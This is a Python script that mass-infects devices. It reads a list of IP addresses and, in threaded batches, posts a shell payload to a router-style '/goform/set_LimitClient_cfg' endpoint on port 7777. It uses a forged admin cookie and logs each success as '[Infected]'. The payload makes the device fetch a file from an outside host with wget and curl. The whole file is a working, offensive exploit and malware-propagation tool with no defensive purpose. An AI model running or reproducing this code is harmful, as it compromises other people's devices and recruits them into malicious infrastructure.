import requests
import sys
import base64
import os
import subprocess
import threading

file_path = sys.argv[1]

def run_command(command):
    subprocess.run(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def all(kk):
    q = "ww" + str(kk)
    return q

def infect(ip, payload, headers):
    url = f'http://{ip}:7777/goform/set_LimitClient_cfg'
    try:
        response = requests.post(url, headers=headers, data=payload, timeout=5)
        if response.status_code == 200:
            print(f"[Infected] {ip}")
        else:
            print(f"[Error] {ip}")
    except requests.exceptions.Timeout:
        print(f"[Timeout] {ip}")
    except requests.exceptions.RequestException:
        print(f"[Error] {ip}")

if __name__ == "__main__":
    with open(file_path, 'r') as file:
        ip_list = file.read().splitlines()

    headers = {
        'Cookie': 'user=admin'
    }

    payload = 'wget https://02ip.ru/31ciberke && curl https://02ip.ru/31ciberke'

    threads = []
    for ip in ip_list:
        t = threading.Thread(target=infect, args=(ip, payload, headers))
        threads.append(t)
        if len(threads) >= 20:
            for thread in threads:
                thread.start()
            for thread in threads:
                thread.join()
            threads = []

    # Start remaining threads
    for thread in threads:
        thread.start()

    # Wait for remaining threads to finish
    for thread in threads:
        thread.join()
